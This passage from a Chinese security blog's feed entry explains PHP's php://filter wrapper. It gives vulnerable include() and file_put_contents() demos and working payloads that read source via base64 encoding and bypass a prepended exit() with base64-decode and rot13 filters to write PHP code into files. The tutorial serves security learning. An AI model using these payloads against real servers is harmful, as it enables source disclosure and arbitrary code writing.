-&lt;pre&gt;&lt;code&gt;php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104201231469.png&#34; alt=&#34;image-20221104201231469&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;说白了，我们可以通过这个伪协议来读写文件，这也和本篇要记录的使用方法息息相关&lt;/p&gt;
-&lt;h2 id=&#34;利用场景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用场景&#34;&gt;#&lt;/a&gt; 利用场景&lt;/h2&gt;
-&lt;h3 id=&#34;配合include读取文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配合include读取文件&#34;&gt;#&lt;/a&gt; 配合 include 读取文件&lt;/h3&gt;
-&lt;p&gt;文件包含和 xxe 中会常见到它的身影，本篇主要对文件包含进行测试和记录&lt;/p&gt;
-&lt;p&gt;demo&lt;/p&gt;
-&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//?file=php://filter/read=convert.base64-encode/resource=index.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104202523263.png&#34; alt=&#34;image-20221104202523263&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;可以通过伪协议来读取文件&lt;/p&gt;
-&lt;h3 id=&#34;绕过file_put_conten中的exitdie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过file_put_conten中的exitdie&#34;&gt;#&lt;/a&gt; 绕过 file_put_conten 中的 exit&amp;amp;die&lt;/h3&gt;
-&lt;p&gt;开始本篇的主要部分&lt;/p&gt;
-&lt;p&gt;主要分俩种情况&lt;/p&gt;
-&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;file_put_contents($filename,&#34;&amp;lt;?php exit();&#34;.$content);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//file_put_contents($filename,&#34;&amp;lt;?php die();&#34;.$content);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;file_put_contents($content,&#34;&amp;lt;?php exit();&#34;.$content);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//file_put_contents($content,&#34;&amp;lt;?php die();&#34;.$content);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;首先来说第一种，就是写入文件时，data 部分前拼接上了 exit 或者 die 使得程序提前终止，写入的 data 不能执行，当然绕过的方式也不难，上面再 include 的利用场景中可以看到 base64-encode 编码，当然也有解码，因为 base64 编码字符没有 &amp;lt;?&amp;gt;, 也就不能正常识别&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104203735374.png&#34; alt=&#34;image-20221104203735374&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里利用的就是这个方式&lt;/p&gt;
-&lt;p&gt;demo&lt;/p&gt;
-&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;@&lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;?php exit();&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;/*get:?file=php://filter/convert.base64-decode/resource=1.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;post:APD9waHAgcGhwaW5mbygpOyA/Pg==&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;这里post前要加一个字符，什么都行，因为base64是4个字符一起解码，前面的phpexit是7位，如果不补齐解码会将后面的D算上，导致解码不出预期结果&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;*/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104204652019.png&#34; alt=&#34;image-20221104204652019&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;成功写入，在短标签没开启的情况下还有一种方式&lt;/p&gt;
-&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//filter/write=string.rot13/resource=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;使用方式相同这里简单的过一下即可&lt;/p&gt;
-&lt;p&gt;接下来记录第二种情况&lt;/p&gt;
-&lt;p&gt;在这种情况下就不能再使用 base64，因为 base64 遇到 = 就终止了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;data=php://filter/write=string.rot13|&amp;lt;?cuc cucvasb(); ?&amp;gt;|/resource=clown.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104211913293.png&#34; alt=&#34;image-20221104211913293&#34; /&gt;&lt;/p&gt;
-</content>
-        <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
-        <category term="伪协议" scheme="https://blog.xcu.icu/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" />
-        <updated>2022-11-04T16:00:00.000Z</updated>
     </entry>
 </feed>
